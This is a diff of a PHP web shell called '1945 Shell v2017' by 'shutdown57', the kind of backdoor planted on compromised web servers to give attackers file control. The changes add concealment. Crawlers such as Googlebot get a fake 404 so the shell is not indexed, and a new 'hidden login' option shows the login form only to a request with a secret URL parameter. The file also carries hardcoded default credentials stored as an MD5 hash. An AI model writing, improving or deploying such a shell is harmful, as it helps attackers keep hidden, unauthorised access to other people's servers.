@@ -1,19 +1,23 @@
 <?php
 /**
-@ 1945v2017
-@ author : shutdown57 a.k.a alinko
-@ codename : merdekaAtoeMati
-@ release date : 17 Agustus 2017
-@ contact : indonesianpeople.shutdown57@gmail.com
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-!!!~~~~~~~~~~~~~~~ Reference ~~~~~~~~~~~~~~~~~~~~!!!
+@ 1945 Shell - 1945v2017 Edition
+@ Author         : shutdown57 < alinko >
+@ Codename       : MerdekaAtaoeMati
 
-~ google.com - pastebin.com - github.com - php.net
-~ sourceforge.net - tutorialspoint.com - adminer.org
-~ indoxploit.or.id - linuxcode.org - devilzc0de.com
-~ madleets.com - linuxsec.org - stackoverflow.com
-~ w3schools.com - indonesia.go.id - w0rms.com
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+-------------------------------------------
+@ Version Name   : Beta First Edition
+@ Version ID     : 0.1 Build 8.9
+@ Release Date   : 18 April 2017
+-------------------------------------------
+@ Version Name   : Beta Test.
+@ Version ID     : 0.8 Build 1.0
+@ Release Date   : 15 June 2017
+-------------------------------------------
+@ Version Name   : Final.
+@ Version ID     : 1.1 Build 1.9
+@ Release Date   : 17 Agust 2017
+-------------------------------------------
+
 */
 session_start();
 ob_start();
@@ -26,12 +30,9 @@ set_time_limit(0);
 @ini_set('display_errors', 0);
 
 if(!empty($_SERVER['HTTP_USER_AGENT'])) { // dissallow from this array userAgent (redirect 404 page)
-    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
-    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-        header('HTTP/1.0 404 Not Found');
-        exit;
-    }
-}
+ $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit","ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");if(preg_match('/'.implode('|', $userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
+
+// 1945 shell configuration | You Can Edit Here.
 @define('ver', '2017');
 @define('host',$_SERVER['HTTP_HOST']);
 @define('title','1945v'.ver.' - '.host);
@@ -39,15 +40,16 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) { // dissallow from this array userAgent
 $usernm_1945 = "1945"; // default username : 1945
 $passwd_1945 = "f509e5b1aa24c8222241883261555ed5"; // default password ; merdeka , change with md5 hash
 $session_name = md5($_SERVER['HTTP_HOST']."_session_1945"); // session name
+$hidden_login =TRUE; // Hidden login, TRUE or FALSE
+$hidden_login_uri = "?login=1945"; // login url , default : shell.php?login=1945
+// End Configuration
 
-function login_1945_merdekaataoemati()
-{
-	echo "<div style=\"margin-top:250px;\" align=center><h3>1945v2017 - Login</h3></div>";
-	echo "<form method=\"POST\"><table align=center ><tr><td>";
-	echo "Username :</td><td><input type=\"text\" name=\"usernm_1945\"></td></tr><tr>";
-	echo "<td>Password :</td><td><input type=\"password\" name=\"passwd_1945\"></td></tr><tr><td colspan=2>";
-	echo "<input type=\"submit\" value=\">>\"></td></tr></table></form>";
-exit;
+function LoginPage1945()
+{echo "<div style=\"margin-top:250px;\" align=center><h3>1945v2017 - Login</h3></div>";echo "<form method=\"POST\"><table align=center ><tr><td>";echo "Username :</td><td><input type=\"text\" name=\"usernm_1945\"></td></tr><tr>";echo "<td>Password :</td><td><input type=\"password\" name=\"passwd_1945\"></td></tr><tr><td colspan=2>";echo "<input type=\"submit\" value=\">>\"></td></tr></table></form>";}
+function login_1945_merdekaataoemati(){
+$requri = explode("=",str_replace("?","",$GLOBALS['hidden_login_uri']));
+if($GLOBALS['hidden_login'] === TRUE){header('Status : 404');header('HTTP/1.0 404 Not Found');if(isset($_GET[$requri[0]])){if($_GET[$requri[0]]==$requri[1]){LoginPage1945();}}exit();
+}elseif($GLOBALS['hidden_login'] === FALSE){LoginPage1945();exit();}else{echo "hello there,shutdown57 !"; exit();}
 }
 if(!isset($_SESSION[$session_name])){if(empty($passwd_1945)||(empty($usernm_1945))||(isset($_POST['passwd_1945'])&&(md5($_POST['passwd_1945']))==$passwd_1945)&&(isset($_POST['usernm_1945'])&&($_POST['usernm_1945'])==$usernm_1945)){$_SESSION[$session_name]=true;}else{login_1945_merdekaataoemati();}}
 class Html45{public function show($str){return print($str);}public function h1($t){$h= "<h1>";$h.= $t;$h.="</h1>";return $h; }public function th($t){$th="<th>";$th.=$t;$th.="</th>";return $th;}public function tr($t){$tr ="<tr>";$tr.=$t;$tr.="</tr>";return $tr;}public function td($t){$td = "<td>";$td.= $t;$td.="</td>";return $td;}public function html($tytyd){ $html ="<!DOCTYPE HTML><html><head>";$html.="<title>".$tytyd."</title>";$html.="<link rel=\"icon\" href=\"http://www.animatedimages.org/data/media/781/animated-indonesia-flag-image-0013.gif\">";$html.="<link href=\"https://fonts.googleapis.com/css?family=Raleway\" rel=\"stylesheet\"> ";$html.="<style>*{font-family:Raleway;}body{font-size:13px;background:#000;color:#fff;}.a_exp{border:1px solid #f00;border-collapse: collapse;width:100%}.a_exp tr:hover{background:#f00;}.a_exp tr:nth-child(even){background:#222}.a_exp tr:nth-child(even):hover{background:#f00} a{text-decoration: none;color:#fff;}.a_exp a{color:#fff;}.a_exp a:hover{text-decoration: underline;}.a_exp th{background:#fff;color:#f00;font-weight:bold}a:hover{border-bottom:1px solid #f00;}.input_m{border:1px solid #f00;color:#fff;width:250px;background:#000}.submit_m{color:#fff;border:1px solid #f00;background:#000}.submit_m:hover{border:1px solid #fff}.input_m:hover,.input_m:focus{border-bottom:1px solid #fff}.txtarea_m{margin-left:30px;border:0;border-left:2px solid #f00;color:#fff;width:98%;height:360px;background:#000}.code{margin-left:40px;border-left:2px solid #fff}.table .kiri{border-right:2px solid #fff;padding-right:30px;}ul{list-style:none;background:#333;}ul li{padding:5px;display:inline-block;}.action{margin-left:40px;border-left:2px solid #fff;padding:2px}.table{font-size:13px}.kuchiyose{background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Flag_map_of_Indonesia.svg/2000px-Flag_map_of_Indonesia.svg.png');background-size:cover;background-attachment:fixed;height:700px;text-shadow:0px 2px 4px #000;}.kuchiyose ul{list-style:none;background:transparent;}hr{border:1px solid #fff}</style>";$html.="<meta name=\"author\" content=\"shutdown57 a.k.a alinko\">";$html.="</head><body>";return $html;}public function a($href,$displ,$attr){$a="<a href=\"".$href."\" ".$attr.">";$a.=wordwrap($displ,60,"\n",TRUE);$a.="</a>";return $a;}public function pre($c){$p = "<pre>";$p.= $c;$p.= "</pre>";return $p;}public function form($method,$input){$form = "<form method=\"".$method."\">";$form.= $input;$form.= "</form>";return $form;}public function input($type,$name,$attr,$label){$input = "<label for=\"".$name."\">".$label."</label> : ";$input.= "<input type=\"".$type."\"";$input.= "name=\"".$name."\"";$input.= $attr;$input.= " class=\"input_m\">";return $input;}public function submit($name,$attr){$sbmt = "<input type=\"submit\"";$sbmt.= "name=\"".$name."\"";$sbmt.= $attr;$sbmt.= " class=\"submit_m\">";return $sbmt;}public function textarea($name,$content,$attr){$txt = "<textarea name=\"".$name."\"";$txt.= "class=\"txtarea_m\"";$txt.=$attr;$txt.=">";$txt.= $content;$txt.="</textarea>";return $txt;}public function actdone(){$this->show("<div class=\"alert_m\"><b>has a job well done !</b></div>");$this->show("What do you want to go back? [<a href=\"javascript:history.go(-1);\">Yes</a> | <a href=\"?_index\">No</a>]");}public function actfail(){$this->show("<div class=\"alert_x\"><b>the task could not be finished :( , Something Wrong!</b></div>");$this->show("What do you want to go back? [<a href=\"javascript:history.go(-1);\">Yes</a> | <a href=\"?_index\">No</a>]");}public function ul($l){$li = "<ul>";$li.= $l;$li.= "</ul>";return $li;}public function li($ll){$ul = "<li>";$ul.= $ll;$ul.= "</li>";return $ul;}public function select($name,$opt,$o){$s = "<select name=\"".$name."\" ".$o.">";$s.= $opt;$s.= "</select>";return $s;}public function option($val,$sh){$o="<option value=\"".$val."\">";$o.=$sh;$o.="</option>";return $o;}public function footer(){$foot = "<div style=\"margin-top:69px;\" align=\"center\">";$foot.= "copyright &copy; ".date('Y');$foot.= " indonesianpeople | 1945v2017 by :";$foot.= $this->a("https://facebook.com/JKT48.co","shutdown57","target=\"_blank\"");$foot.= "</div>";return $foot;}}
@@ -175,4 +177,8 @@ if($_POST['action']=='copy'){$_SESSION['files_select']= array();$n=0;foreach($_P
 $html->show("</table>");
 }
 $html->show($html->footer());
+
+
+// Thanks To Big Family JavaCodeRulez
+// http://javacoderules.io
 ?>
